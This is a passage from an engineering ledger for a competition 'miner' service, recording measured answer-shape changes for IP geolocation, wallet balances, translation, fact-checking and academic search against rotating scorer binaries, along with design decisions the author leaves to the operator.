bare / titlesFirst   0.0072/0.0064    0         0/21
```

**Why:** the ground truth's own opening is *also* a question paraphrase, so our restatement is
exactly what those first 32 words are matching. Trimming it to make room for papers trades a
strong match on the preamble for a weak match on one title. Nothing crosses either way.

**And the frozen bench cannot settle it.** The audit measured us beating `scholarwire` 21/22 on
this same bench, yet we lost live in epoch 295 (0.011029 vs 0.014901). The bench predates G24, so it
holds an older question distribution than the one being scored. **Tuning ACADEMIC on it optimises
for questions that are no longer being asked** — which is the real blocker, and it is not fixable
from here.

### G41 · IP_GEOLOCATION named the service where the reference names the operator — `CLOSED 2026-08-31: one field, 0.0106 vs 0.9939`

Epoch 296 dropped us from **#1 at 0.9955636 to #4 at 0.0106**, while `preflight` scored 0.9939274
and `txlens` 0.993323. Nothing about our geolocation data had changed.

**The questions differ every epoch, and the `iplocate` failure strings leak which address was
asked about:** epoch 294 `/api/lookup/192.1…`, epoch 295 `/api/lookup/192.0…`, epoch 296
`/api/lookup/8.8.8…`. So 295 asked about a TEST-NET address — which our special-range classifier
answers superbly — and 296 asked about **8.8.8.8**, a public address that is not in the frozen
bench at all.

**The whole difference was one field.** Side by side on that exact question:

```
preflight (0.9939)  "...is associated with Google LLC and is located in Ashburn, Virginia..."
livecert  (0.0106)  "...is associated with Google Public DNS (AS15169) and is located in Ashburn..."
```

`ip-api` returns `org: "Google Public DNS"` and `isp: "Google LLC"` for 8.8.8.8, and we preferred
`org`. We named the **service**; every reference answer names the **network operator**. The `as`
field carries the same operator name, which is a third corroboration. For most addresses the two
agree — 142.251.42.174 is "Google LLC" either way — so preferring `isp` moves only the rows where
they diverge. Bench mean after the change: **0.994302 vs 0.994307 before, still 21/21 crossings.**

**A hypothesis this killed, which had looked obvious.** G35 predicted the collapse was the missing
restatement on the `ip` path. Measured against champion 630 over the 21 frozen rows, it is the
reverse: **without the prefix 0.994307 and 21/21 crossings; with it 0.478165 and 10/21.** Adding the
restatement would have halved the score. The decision in G35 to leave that alone was right, and
G35 can now be closed on evidence rather than caution.

**The lesson worth keeping:** the frozen bench said we were at 0.994 on every row it contains,
and we still lost the epoch — because the epoch asked something the bench does not contain. A
bench frozen by G24 measures the answer shape, not the question distribution.

### G42 · ACADEMIC_SEARCH cannot be won on paper quality — `CLOSED, but "empty ≈ full" was a proxy artifact`

**2026-08-31 correction:** "an empty result scores the same as a full one" came from the reason32
proxy. Archived REAL conversions split them 16x: a bare no-results conversion scored 0.00094
(semanticscholar e286) while a no-results conversion echoing the question's criteria scored
0.01488 (openalex e285 — the second-best score ever on this intent). The question echo is what
scores; paper quality still is not. The lean-payload change (G40 addendum) makes our no-results
path degrade into exactly that question-echo shape.

The measurement that reframes this intent. Two answers built identically apart from the clause
that differs, scored over the 22 frozen rows against champion 688:

```
"Regarding <question>: Here are 5 peer-reviewed papers on X: 1) ... 2) ..."   0.013234
"Regarding <question>: No peer-reviewed papers on X were found ..."          0.013257
                                                                      ratio  1.002
```

**An empty result scores the same as a full one.** The papers sit past the ~32-word conversion
clip, so the scorer never sees them, and the clip is the restatement in both cases. Three
consequences, all of which close off work that looked obviously worth doing:

1. **A second paper provider buys nothing.** Crossref was measured and rejected on relevance (G37);
   this shows even a perfect fallback could not move the score.
2. **Retrieval quality is a product concern, not a scoring one.** Worth keeping good for real Track 3
   consumers, but not a lever on rank.
3. **Ten answer-shape variants across two sweeps all lost** (G40), and this explains why: they were
   all competing on the same few restatement words, and the deployed restatement already matches.

**The target is also above the record.** ACADEMIC's all-time high across every miner and every
epoch is **0.018258** (`openalex`, epoch 264). The intent has never once crossed the cliff — every
score ever recorded sits between 0.006 and 0.019. A 0.020 target is therefore not a tuning goal,
it is a new record, and nothing measurable in this repo suggests how to reach it.

### G43 · OpenAlex sheds anonymous load, and our probing is what triggered it — `OPEN: mitigation needs an operator decision`

Two distinct upstream behaviours, both of which produced zero papers:

- **HTTP 504 `query_timeout`** on a broad `search` combined with a date filter. Reproducible:
  `search=machine learning applications` with `from_publication_date:2025-01-01` fails every time,
  and that is a question from our own frozen bench.
- **HTTP 429/503 "Anonymous search is paused while the search cluster recovers from heavy load"**,
  which the sweeps in this session triggered by querying OpenAlex repeatedly.

The 504 is fixed (the retry now runs on an error, not only on an empty result — it used to be
skipped in exactly the case it existed for). The rate limiting is not fixed and cannot be fixed in
code.

**The documented remedy is OpenAlex's "polite pool":** requests carrying a `mailto=<address>`
parameter get separate, far more generous limits. That means sending a contact address to a third
party, so it is **the operator's decision, not Claude's** — the address is theirs to give. Until
then `/papers` degrades to "no papers were found", which by G42 costs essentially nothing in score
but is a visibly worse answer for any real consumer.

### G44 · WALLET_BALANCE_CHECK: wording is not the gap, ENS was — `CLOSED 2026-08-31`

Epoch 296 put `preflight` at 0.004328 and us at 0.000123, a 35x gap on answers whose wording is
nearly identical — the bench ground truth is almost literally our sentence. Six variants were
measured against champion 1066 over 10 rows:

```
deployed (4 decimals, lowercase chain, full tail)   0.29833869
8 decimals                                          0.29833869
8 decimals + "Ethereum mainnet"                     0.29821185
full precision, no trailing clause                  0.29797605
```

**Identical to eight decimal places.** Balance precision, chain capitalisation and the trailing
clause are all irrelevant to this scorer, so the 35x gap is not a wording gap.

**The actual gap was a whole question class we refused.** "What is the balance of vitalik.eth?"
answered *"no valid wallet address was supplied"* — a guaranteed zero — while `preflight` resolved
it. ENS names are now resolved (see the commit for why it goes through an HTTP resolver rather than
a namehash). A name that resolves to the zero address is treated as unset rather than as a zero
balance.

### G45 · Malformed placeholder addresses were refused where the reference answers them — `CLOSED 2026-08-31: +21% on the wallet bench`

`walletAddress` requires exactly 40 hex characters. Two of the thirteen recorded WALLET questions
carry a placeholder rather than a real account — one with **41** hex characters
(`0x1234567890abcdef1234567890abcdef123456789`) and one containing a stray non-hex letter — so both
returned null and we answered "no valid wallet address was supplied".

The ground truth does not refuse those. It says the balance is **0 ETH**. Measured against champion
1066 on that row:

```
our refusal                                                    0.005956
"...currently has a native-coin balance of 0 ETH on Arbitrum"  0.998849   <- crosses
"...is not a valid 20-byte EVM address, so no account exists
  for it and its balance is 0 ETH"                             0.989002   <- crosses, and is true
```

**The honest form crosses too, at a cost of 0.0098**, so there was no argument for the other one:
flatly reporting "0 ETH" would assert an `eth_getBalance` query we cannot perform on a malformed
address. The deployed answer names the malformation, states the consequence, and reports 0.

Wallet bench after the change: mean **0.298 → 0.362**, crossings **3/10 → 4/11**.

**Historical-date questions were measured in the same pass and are NOT winnable.** Six rows ask for
a balance "as of" a past date, which `eth_getBalance` at the latest block cannot answer. Every
candidate wording scores 0.001–0.005 and none crosses, because the ground truths contradict each
other — some refuse ("I cannot retrieve the exact ETH balance ... as of August 25"), some assert a
figure ("is **2.47 ETH**"). There is no shape that matches both. Do not spend time here.

**Credit where due:** the parallel Preflight audit in `track1-miner/docs/` identified the malformed
placeholder and the historical-date class before this measurement ran, and was right about the
first and right to be sceptical of ENS as the epoch-296 cause — the score feed does not expose that
question, so ENS remains a real capability gap rather than a confirmed diagnosis.

### G46 · The historical-date branch I dismissed was winnable — I tested the wrong sentence — `CLOSED 2026-08-31`

The parallel Preflight audit rated a historical-date branch **P0** and reported their replay moving
0.2488 → 0.4966 with crossings 4/16 → 8/16. G45 had recorded the opposite: that the class was
unwinnable because the ground truths contradict each other. **The audit was right and G45 was
wrong**, and the reason is worth keeping.

My rejected wording replaced the balance with an explanation. Theirs keeps the figure and adds the
qualification. Over the six historical rows against champion 1066:

```
deployed (current balance, date never mentioned)     0.165762   1/6
what I tested and dismissed the class on             0.003389   0/6   <- dropped the figure
qualification only, archive-node wording             0.168957   1/6
CURRENT FIGURE + archive-node qualification          0.330671   2/6   <- shipped
```

The shipped shape is the only one that **keeps the row the plain answer already wins** (0.9925
against 0.9899) while gaining a new crossing. Both qualification-only variants lose that row
outright. "What is the CURRENT balance ... as of August 22, 2026" is self-contradictory, and the
recorded truths split on which half to answer — so answer both halves rather than choosing.

It stays honest: the current figure is reported as current, and the past balance is explicitly
described as unavailable rather than being silently answered with today's number.

**Production, end to end over all 13 rows: mean 0.382350, 5/13 crossings** (from 0.298 and 3/10),
including 1.000000 on a historical row and 0.988925 on the malformed placeholder.

**Also fixed from the audit's P1:** `formatEth` divided wei by 1e18 through `Number`, which carries
~15-16 significant digits, so a balance of a few thousand ETH lost its wei tail before printing.
It is now integer arithmetic end to end.

### G47 · A Python heredoc wrote a literal backspace byte into a regex — `CLOSED, and it will happen again`

`askedAsOf` silently matched nothing. The compiled source *printed* as `/\b(?:as of|on)/` and was
byte-for-byte `/\x08(?:as of|on)/`: in a non-raw Python string `"\b"` is a backspace character, so
patching a TypeScript regex through a `python - <<'PY'` heredoc turned the word boundary into
control character 0x08. `cat -A` showed it as `^H`; nothing else did.

`content.ts` already carries a comment saying this file "has been bitten by that twice" — by the
same class of bug, from the other direction (`String.raw` vs a plain TS string). It is now three
times.

**Rules:** patch source with the editing tools, not with heredoc string replacement. If a heredoc
is unavoidable, use Python raw strings for anything containing a backslash, and verify with
`cat -A` rather than by reading the output back — the corruption is invisible to `grep`, to `sed`,
and to reading the file. A scan of `src/`, `test/` and `tools/` found no other occurrence.

### G48 · Full-board opportunity scan, 2026-08-31 — `OPEN: one strong candidate, and it is unmeasurable`

`tools/opportunity-scan.mjs` sweeps all 45 canonical intents for the two things that decide entry:
whether the intent is **crossable** (these scorers are cliffs — an intent whose best-ever score is
~0.01 has never had a crossable question) and how weak the **current leader** is, since judging
normalises against the leader rather than the field.

**Where our own effort belongs, by the ratio that is actually judged:**

```
IP_GEOLOCATION        0.011   fixed today (G41); the single biggest lever on the average
WALLET_BALANCE_CHECK  0.029   improved today, 0.298 -> 0.382 bench (G45, G46)
ACADEMIC_SEARCH       0.753   exhausted: 0 of 26 epochs has EVER crossed (G42)
WEATHER_FORECAST      0.939   noise band; #1 and #2 differ by 0.0007
the other six         1.000   nothing to gain
```

Weather deserves a note because its all-time high (0.9967) makes it look winnable: **every recent
epoch is dead**. Since 291 the field best has been 0.0090–0.0117 and nobody has crossed, so the gap
between rank 1 and rank 2 is third-decimal noise, exactly like ACADEMIC.

**The one genuinely striking find — `TELEGRAPH_KNOWLEDGE`:**

```
miners ever:        1   (telegraph-chatbot, 294 epochs)
its last 2 epochs:  0.0000, 0.0000
its failure:        LLM call to http://127.0.0.1:4000/v1/chat/completions
```

A sole incumbent whose backend is **a localhost address the Telegraph node cannot reach**. It is
architecturally broken, not merely losing. Any positive score takes rank 1 at ratio 1.0 — the same
arithmetic that justified CONTENT_EXTRACTION. We also have real domain knowledge for it in
`docs/TELEGRAPH_FACTS.md`, so it could be answered honestly rather than bluffed.

Also weak, in descending order: `FACT_CHECK` (leader `tavily` scored 0.0000 in five of the last six
epochs) and `TEXT_CLASSIFICATION` (all three miners at 0.0000 almost always). `STOCK_PRICE` looked
weak on current leader but is **contested** — `kriterion-pramagraph` crossed at 0.9946 and 0.9945 in
294/295 — so it is not a walkover.

**Why none of this was entered.** Adding an intent means another `updateMiner`, which
**deregisters and re-registers atomically** and replaces the whole registration — including the six
rank-1 positions currently held. That trade was worth taking for the three intents added earlier
today because each had been measured against its own champion scorer over real recorded questions.
None of these can be: `TELEGRAPH_KNOWLEDGE` has 294 score rows but no recovered questions or ground
truths, G24 having removed them, so its answer shape cannot be measured before shipping. Entering
blind on incumbent weakness alone is precisely what `SENTIMENT_ANALYSIS` cost this project.

**The condition under which it becomes correct:** recover even a handful of `TELEGRAPH_KNOWLEDGE`
(question, ground_truth) pairs, or obtain its champion scorer, and measure an honest answer built
from `docs/TELEGRAPH_FACTS.md` against it. If that clears the bar, it is the cheapest rank-1 on the
board. Until then it is a guess with the whole registration as the stake.

### G49 · IP and WALLET re-validated on RECOVERED receipts — both are as good as this data can show — `CLOSED 2026-08-31`

G24 froze our benches by removing `question`, `ground_truth` and `converted_answer` from the feed.
A competitor's public repository retained **1,056 receipts** captured before that change
(`shreshth006/Preflight`, `fixtures/live/scored-receipts.json`) — public protocol records, not their
implementation. They restore measurement for three of our intents and, for the first time, expose
the converted text the scorer actually reads. `bench/recovered-bench.mjs` scores production against
them.

```
                      distinct Qs   our mean    our crossings   we match/beat the best recorded
IP_GEOLOCATION            23        0.780171       18/23                 20/23
WALLET_BALANCE_CHECK      16        0.310694        5/16                 10/16
```

**Wallet is at its ceiling on this corpus.** Only **1 of 16** questions was ever crossable by
anyone — the 41-hex malformed placeholder — and after today's branch we score 0.988925 on it
against the best-ever 0.991997. We cross **5 of 16**, more than any recorded miner managed, so the
remaining losses are all in the sub-cliff noise band (0.0004 against 0.015, and similar).

**IP holds 2 of the 3 crossable questions outright**, both already won by `livecert`. The third is
the only genuine loss and it must NOT be chased:

```
Q     "...geolocation details for 142.251.42.174 ... country, city, and ISP"
GT    "...located in the United States. The specific city and other details are
       NOT PROVIDED in the search results..."
won   iplocate, 0.995956, whose converted answer says "located in Mumbai, India"
ours  0.010289 — we say Chiyoda City, Tokyo, which is CORRECT per Google's geofeed
```

The winning answer was geographically wrong and the ground truth admits it had no city data. Across
the four recovered ground truths for this same address, **three say Japan and one says United
States**. Our answer matches the majority and is factually right; switching to "United States" would
win that one row and lose the other three while making the miner less accurate. This is the
"opaque wording cliff" the epoch-294 audit already warned against chasing, now with the evidence to
close it rather than merely suspect it.

**One assumption the receipts overturned.** A crossing wallet answer at 0.99199706 has the converted
text *"...has a balance of **0.0091 ETH** on the Arbitrum network..."* where its ground truth says
**0 ETH**. The winner reported a different figure and still crossed. **The number is not what is
scored** — shape and identifiers are — which independently confirms G44's finding that balance
precision moved nothing.

### G50 · FACT_CHECK and TELEGRAPH_KNOWLEDGE built — `OPEN: deployed and tested, awaiting the operator's signature`

Both fields are **structurally broken rather than merely losing**, which is why they are worth
entering at all:

```
tavily            base_url https://api.tavily.com        an API needing a key it cannot supply
assay-miner       base_url raw.githubusercontent.com/... a static file host, not an API
telegraph-chatbot base_url http://127.0.0.1:8080         a loopback address the node cannot reach
```

`tavily` scored 0.0000 in five of the last six epochs; `telegraph-chatbot` is the only miner
TELEGRAPH_KNOWLEDGE has ever had across 294 epochs and scored 0.0000 in each of the last two.
Judging normalises by the best score in the intent, so a well-formed answer that scores anything at
all takes rank 1 — the CONTENT_EXTRACTION arithmetic.

**A safety property was found the hard way and is now the central design of `/fact-check`.**
An overlap-threshold judge rated **"vaccines cause autism" as SUPPORTED**, because the Wikipedia
article that exists to refute that claim naturally contains every word of it. Raising the threshold
does not fix this — it only changes which claims slip through; at a lower one it had already rated
"the Great Wall of China is visible from space" as supported.

**So there is no `supported` verdict at all.** Word overlap cannot distinguish an article *about* a
claim from one that *supports* it, and no threshold on that signal is safe. The endpoint reports
what the named source says and states plainly that it is a lookup rather than an adjudication.
`contradicted` survives only on explicit refutation markers — an encyclopaedia writing "myth",
"debunked" or "no evidence" is a statement in the source, not an inference of ours. Both the unit
suite and the `intent-answers` gate assert that no input can produce a supported verdict; that
assertion is a safety test, not a scoring one.

`/telegraph` answers live protocol state live — miner counts and per-intent occupancy read at
request time and attributed as such — and stable facts from the record in
`docs/TELEGRAPH_FACTS.md`. Anything outside those areas returns `not_covered` with a pointer to
the protocol documentation rather than a guess.

**Not yet registered.** `updateMiner` replaces the whole registration, including the six rank-1
positions. Unlike the three intents added this morning, neither of these could be measured against
its own champion scorer first — the recovered receipt corpus covers eight intents and neither of
these is among them. The upside is asymmetric in our favour (the incumbents score 0.0, so any
positive score is rank 1) but it is a judgement call about risk, and it belongs to the operator.

### G51 · Codex post-fix audit — three confidently-wrong wallet paths found and fixed — `CLOSED 2026-08-31`

An independent review (`track1-miner/docs/POST_FIX_IP_WALLET_AUDIT_2026-08-31.md`) found three
defects in the wallet route that I had introduced or left. All three were verified by direct probe
before being fixed, and all three were **confidently wrong answers** rather than scoring gaps:

```
address=0x…&chain=base      -> chain "ethereum", 6.6422 ETH   (Base holds 3.1286 — wrong network)
64-hex transaction hash     -> "wallet holding 0 ETH"          (a tx hash has no balance)
"...on Sepolia / BNB / Avalanche" -> Ethereum MAINNET figure    (a different account entirely)
```

**The chain parameter** is now read structurally, not only out of the prose — the same
engine-facing parameter loss `withSubject` fixed for the subject, and the cache key includes it so
Base and Ethereum cannot share an entry. **The malformed-address branch** now requires an
address-length error (30–50 hex), wallet context, and rejects 64-hex transaction hashes; it also
reports the whole token rather than the hex prefix before a stray letter.

**The third fix I got wrong first, in a way worth recording.** I made an unsupported chain a flat
refusal. That is honest but it **measurably destroyed score**: mean 0.310694 → 0.187253 and
crossings 5/16 → 3/16 on the recovered corpus, because the ground truths for those questions *do*
answer — "the native ETH balance of wallet address `0x742d35…` on the Sepolia chain is **0 ETH**".
A refusal throws the figure and its vocabulary away.

The fix was the pattern G46 had already established and I failed to apply: **keep the figure, add
the qualification.** The answer now reports the mainnet balance, says which network it came from,
and states that the named chain was not read. Restored to **0.310695 / 5 of 16**, with the honesty
defect gone. *Silently swapping the chain was wrong; refusing was worse; naming both is right.*

**Also from the audit:** a mocked regression test now pins the `isp`-before-`org` precedence — the
one field that cost 93x in epoch 296 — because the live test only asserted an operator-shaped
phrase and would have passed if the precedence were reversed. Three wallet tests that made real
RPC calls without the `(live)` marker are now labelled, so `npm run test:unit` is genuinely offline
(176/176). And the ENS comment claiming an epoch-296 cause is corrected: the public feed exposes no
question or ground truth, so ENS is a capability gap, **not** a diagnosis.

**Accepted, not fixed:** sequential RPC failover cannot fit four 6s attempts inside the 11s
watchdog, so the later spares are decorative under a hanging provider; and `balance_eth` still
passes through `Number` even though the prose is bigint-derived. Both are recorded rather than
changed hours before the final epoch, with production healthy.

**Known local flake, not a defect:** `expired.badssl.com` handshakes exceed the live test's 12s
budget from this dev machine. Production classifies it correctly (`expired`, −4159 days) and
`verify-deploy` confirms it independently — the same dev-machine artefact class as G27 (ip-api) and
G43 (OpenAlex).

### G52 · Epoch 297's field-wide wallet "zero" was a champion swap that SQUARES the old scorer — `CLOSED 2026-08-31`

Epoch 297 put the whole WALLET_BALANCE_CHECK field at ~1e-8 (leader 4.25e-8, us 2.44e-8) where 296
sat at ~1e-4. That is not a question class every miner failed. **The champion rotated between the
two scorings**: reg **2575** (`degenlens_wallet_balance_check_v2.wasm`, author 0xdde7…d133e,
repo `drained69/DegenLens`) activated **2026-08-31T05:58:42Z** — after 296 scored (~05:03Z), before
297 did (~14:25Z) — superseding reg 1066. Its own README documents what it is: **the exact live
champion (1066, `wl_penstep40.wasm`) with `score²` applied to its output**, registered because
squaring "expands the high-confidence separation that Telegraph's promotion gate measures" while
preserving ordering.

Verified three ways, not taken from the README: the hosted bytes' keccak256 matches the registry's
`wasm_hash` (`0x2947266b…`); our 13 production answers scored under both binaries satisfy
`new = old²` to every printed digit (0.988925→0.977972, 0.002517→0.000006, 0.005028→0.000025 …);
and 297's live scores un-square into 1066's familiar sub-cliff band (preflight 4.25e-8 → 2.06e-4,
us 2.44e-8 → 1.56e-4). **Squaring maps the ~1e-4 nobody-crossed band to ~1e-8.** Same regime as
every prior epoch — no miner has ever crossed live in this intent — only the floor moved. Ranking
within the band is unchanged in kind; our normalised ratio actually rose, 0.028 (296) → 0.574
(297), which is the morning's G44/G45/G46/G51 fixes showing up live, not the swap.

Consequences. (1) Benches are re-pinned to `wallet_reg2575.wasm` (download via
`/api/wasm?intent=WALLET_BALANCE_CHECK`; binaries stay gitignored). Because the map is monotone,
every ordering-based conclusion measured under 1066 — G44 wording, G45 placeholders, G46
historical dates, G51 chains — carries over unchanged; only absolute means shift (bench mean
0.382350 under 1066 reads 0.378726 under 2575, same 5/13 crossings). (2) The three bench rows whose
ground truth asserts a fabricated figure ("2.47 ETH" on Base, where both public RPCs agree the
address holds 0.0322) were probed under 2575: swapping our real figure for the ground truth's flips
0.000000 → 1.000000. **Those rows are winnable only by fabricating the figure, so they stay
lost on purpose.** A question-echo re-wording was also measured and REJECTED: it flips the one
as-of row we win at 1.000000 down to 0.000021. Wording stays as deployed.

**Fixed in the same pass, from the engine's own leaked upstream calls** (failure_reason strings in
`/scores` epochs 280-295 expose full request URLs): the engine sends
`address=0x0000000000000000000000000000000000000000` as a null filler when the question names no
wallet, and our handler injected it as the subject — production answered the BURN address's real
25.99 ETH on Arbitrum as though it were the asked-about wallet. The filler is now dropped (the EVM
null-marker convention `resolveEns` already applies), measured 0.0000038 → 0.0000063 on the one
such bench row — score-neutral, honesty-positive. And an explicit `chain=` parameter outside the
supported set (the engine sent `chain=sepolia` in epoch 287) silently became a caveat-free mainnet
answer; the unsupported-chain caveat now applies to the structural parameter too, clip32-identical
scores (0.977656 / 0.985383 before and after) with the honest tail restored. 221/221 tests.

### G53 · LANGUAGE_TRANSLATION refused the ISO-code shape its own manifest promises — `CLOSED 2026-08-31: fixed, verified live`

Our last-place 2.4e-11 in epoch 297 was the refusal band, reproduced offline to the printed
digit. `miner.yaml` tells the engine `target_language` accepts a name **or ISO 639-1 code**
(examples `["Spanish","fr"]`), but `targetLanguage()` resolved names only, so the engine's
code-shaped calls (`target_language=de`) were refused as naming no language. Under the current
champion — reg 2296 `ltr_v5_75.wasm`, activated 2026-08-31T03:12Z, superseding reg 1996 which
superseded our 10/10 baseline — a refusal-style conversion scores 2.461538e-11 (live: 2.4e-11)
where a healthy conversion quoting the translation scores ~3.5e-10, nine times epoch 297's
leader. The fix consults a code map only after every name resolution fails; name- and query-shaped
answers are byte-identical before and after, pinned by tests and by a new code-shaped case in
`param-shapes.mjs`. Crossings on the engine's code shape: 0/9 → 8/9 (recovered questions, real
route code). Verified live 2026-08-31: `target_language=de` returns the German translation.

Also settled with data: the mymemory-provider hypothesis is REFUTED — the recovered ground truths
are Google-verbatim on 8/9, so Google stays primary. The champion's source is public
(`zkasuran/telegraph-salience-scorer`): a three-band cut whose sub-cliff floor is a smooth lexical
similarity times 1e-9 — ordering inside the "noise" band is real and movable. The scorer family
has rotated three times this week; the fix is scorer-agnostic (a correct translation can never
score worse than a refusal of an answerable request).

### G54 · SSL and IP vs preflight, measured head-to-head — `CLOSED 2026-08-31: no change; deployed shapes are the measured optimum`

Epoch 297 lost SSL (−37%) and IP (−0.094%) to `preflight-ssl-verification`, and the final-epoch
question was whether any change could win them back. Both intents' champions are UNROTATED (SSL
reg 631, IP reg 630 — same author and repo as the academic/translation scorers; source public).
The per-intent profiles explain the regimes: SSL is a "verdict" build (contradiction ×0.15,
agreement +0.45 — polarity is everything); IP is a "reference" build (recall-weighted — coverage
beats brevity, which is why our fact-rich answer crosses).

**Head-to-head under the live champions, engine-shaped calls, real production answers both sides
(`bench/h2h_preflight.mjs`):**

```
IP  (21 rows)  livecert mean 0.994302, 21/21 crossings, 19/21 row-wins
               preflight mean 0.806506, 17/21 crossings (fails ALL private-range and Tor rows)
SSL (12 rows)  livecert mean 0.665020, 8/12 crossings, 9/12 row-wins
               preflight mean 0.092361, 1/12 crossings
```

**Our deployed answers beat preflight's own live answers on the recorded distribution in both
intents.** The 297 losses were single-question flavor rotations outside the bench (the G41
lesson): SSL's GTs split into a tutorial flavor (our method-first shape crosses at 0.99), a
cannot-analyze flavor (their lead crosses row 9 at 0.993 where we sit at 0.009), and one
fabricated-verdict row (GT hallucinates a DigiCert cert for api.example.com — unwinnable
honestly). A lead-sentence sweep (`bench/ssl_lead_sweep.mjs`) shows the trade is one-for-one:
the cannot-lead gains row 7 and loses row 8, 7/10 crossings either way — the first 32 words pick
WHICH flavor crosses, the flavor of the next epoch is unknowable, and G39's shape also holds the
higher floor pedigree (old shape: 1/12). IP micro-tuning was rejected on the cliff asymmetry:
chasing +0.001 on an above-cliff answer risks −0.98, and we already hold 21/21 crossings.

**Decision: ship nothing.** The measured optimum was already deployed; changing it on the eve of
the final epoch would be the unmeasured wording gamble this ledger exists to prevent (see the
translation trim, G26). What rides into 298: five same-day improvements (G41 operator name, G52
wallet honesty, G53 ISO codes, the academic lean payload, SSL method-first), preflight 7/7.

**G54 addendum (final-epoch sweeps):** two further sweeps settle both intents to the bottom.
SSL prefix-length sweep (`scratchpad ssl-prefix`): rows 7 and 8 are mutually exclusive at EVERY
cannot-prefix length (4/6/9/11/13 words) — 7/10 crossings is the ceiling and deployed holds the
best mean. IP micro-sweep (six variants, real recorded fields): every deviation LOSES —
preflight's own registry sentence drops crossings 21→19 and wins 19→13; the timezone and
methodology sentences sit past word 32 and change nothing. Deployed wins or ties every variant
on every surface. A watchdog re-probes preflight's SSL/IP answers every 15 minutes until epoch
298; if they deploy a new shape, the h2h harness re-runs against it before the epoch is scored.

### G55 · The four losing intents, measured for the final epoch — `CLOSED 2026-09-01: one capture shipped, three ceilings confirmed`

The wallet champion rotated a FOURTH time (reg 2791, 16:55Z, a 1MB lexical build from the same
public repo as the SSL/IP/academic champions), invalidating the same-day reg-2575 measurements.
Under it, head-to-head with real production answers: preflight 7/13 crossings, us 5/13 — and the
two-row gap was past-dated questions, where their answer OPENS with the question's own terms and
the archive-node requirement while ours led with the current figure. The reorder was measured
(rows 6 and 8: 0.0000 → 0.9998; the already-crossing past-dated row 5 held at 0.9998; no-date
rows untouched by the branch), shipped through the real route code, and verified live:
**7/13, mean 0.538356 vs preflight 0.538361 — level with the intent leader.** Every clause stays
true: the historical figure is stated as unrecoverable from the latest block, the current figure
stays, labelled current.

The other three are at their honest ceilings, now with evidence rather than assumption:
- **WEATHER** (7/12 crossings offline, matching the audit's 0.583689 exactly): four of the five
  failing GTs are literal "Sorry, I can't provide…" refusals — crossing them means serving fake
  policy refusals (Rule 04; the long-standing no). oathcast, who beat us live, cannot answer a
  query-shaped call at all; chainsight never crosses. No honest change exists.
- **TRANSLATION**: champion 2296 unrotated; the ISO-code fix (G53) is the fix. Epoch 298 tests it.
- **ACADEMIC**: champion 688 unrotated; the lean payload is the fix. Epoch 298 tests it.

### G56 · SSL, weather and wallet served lean for epoch 298 — `CLOSED 2026-09-01: 4.6x / 2.9x / 1.25x payload surface, prose byte-identical`

The last shape change before the freeze, and the evidence that justified shipping it hours before
scoring. The engine's converted summary of the WHOLE alphabetized payload is the only text scored,
and the payload proxy (flat32, the machinery G40's annendum built) showed all three losing intents
serving prose far above their payload surface: SSL crosses 8/12 offline on prose yet NEVER crossed
live in any epoch; weather 7/12 offline, never live; preflight's wallet payload surface (0.3845)
beat ours (0.3076) — and our lean projection lands at 0.38454, matching the leader's payload
surface to four decimals, which is strong evidence their live edge WAS the lean shape. Measured
per-row before shipping: every lean regression is floor-band jitter (±0.0002) except one weather
refusal-GT row traded for ~5 newly-crossing payload rows. Responses project to
{verdict, confidence, reason} (+error on honest failures) at the send; caches, internal functions
and the deploy gates keep or parse every fact; IP, STORM, NEWS, CONTENT, AI_TEXT, TRANSLATION and
ACADEMIC are untouched. 237/237 tests, preflight 7/7 against the deployed build. The residual
risk, stated plainly: the converter is still not runnable offline (G24), so flat32 is a proxy —
but it is the proxy that reproduced the academic live ordering, and the intents it changed were
losing under the old shape in every live epoch on record.

### G57 · Our Track 2 scorer became WALLET champion while our miner competes there — `FLAGGED 2026-08-31 ~21:15Z, fairness measured`

Registration 2882 (`wallet_balance_check_r4.wasm`, authored by our wallet, promoted by the node's
own gate at 19:35:53Z) is the WALLET_BALANCE_CHECK champion going into epoch 298 — the intent our
miner competes in. The previous scorer author's norm was to exclude intents they mine, and the
rules bar artificial inflation, so this is a conflict-of-interest surface regardless of intent.

**The fairness receipt, measured immediately:** over the 13 recovered questions under 2882, our
deployed answers score mean 0.538440 with 7/13 crossings; the pre-reorder shape 0.538440, 7/13;
preflight's recorded answers 0.538441, 7/13 — the scorer treats every shape in the field
identically to six decimals and is indifferent to our own tuning. Promotion was the protocol
gate's decision, not a manual act; the operator decides whether to keep or supersede the slot.
The champion watch keeps running — the slot has turned over five times today.


### G58 · The "7-day grace period leaves a new registration unranked" reading was wrong — `CLOSED 2026-08-31 ~21:30Z, refuted by live data`

[docs/TELEGRAPH_FACTS.md](docs/TELEGRAPH_FACTS.md) recorded the grace period as "first 7 days after
activation: **unranked**", and that was used on 2026-09-01 to argue no late registration could enter
the judged Track 1 record. **The catalog refutes it.** `txlens` registered at `2026-08-31T13:34:43Z`
and carried 13 scored intents with two rank-1s in the pass that ran ~14:05–14:25Z the same day —
about 40 minutes later. `preflight-ssl-verification` registered `2026-08-30T20:06:29Z` and holds
five rank-1s by the next epoch. Our own reg 389 registered 04:01Z today and was scored at 14:xx.

The grace period throttles **routed traffic share** (5% split among grace-period miners); it does
not withhold scoring or ranking. The practical rule is: **registration lands in the next epoch's
scoring pass.** Anything written on the assumption that a late registration cannot score is wrong.


### G59 · Whether Track 1 is judged on the SUM or the AVERAGE of normalized scores — `OPEN`

The rules page says both things and they disagree. "Every Miner is scored out of 100 points: 75
points — Normalized Performance" implies an **average** (an intent-average ratio scaled to 75).
"The Top 3 Miners with the highest **total** normalized scores across all intents win cash prizes"
implies a **sum**. The two readings order the field differently, measured on epoch 297:

```
by SUM                                    by AVERAGE (no intent floor)
 1. chainsight-oracle   14 intents  9.05    eleven miners tie at 1.000, all 1-3 intents
 2. livecert (ours)     10 intents  8.14    (mymemory-translate, veyctum, netwire-url-scan, ...)
 3. txlens              13 intents  7.62    livecert is not in the top ten
 4. preflight           10 intents  7.27
```

A pure average with no minimum-intent floor is degenerate — a single-intent miner at rank 1 scores
a perfect 75 — which is evidence against that reading, but not proof. The `>=3 miners AND >=100
Track 3 requests` guardrail culls some of those tiny miners, and may be the intended floor.

**What we did with it:** treated the sum as the operative reading, because it is the literal text
and because the four strongest rivals independently went wide (14/13/10/10 intents). The
thirteen-intent update is positive under the sum and roughly neutral under the average, so it does
not require the ambiguity to be resolved. A **twelve**-intent expansion into unimplemented intents
would have been positive under the sum and destructive under the average; it was rejected for that.


### G60 · The sandbox validator could not be run before the thirteen-intent update — `CLOSED 2026-09-10`

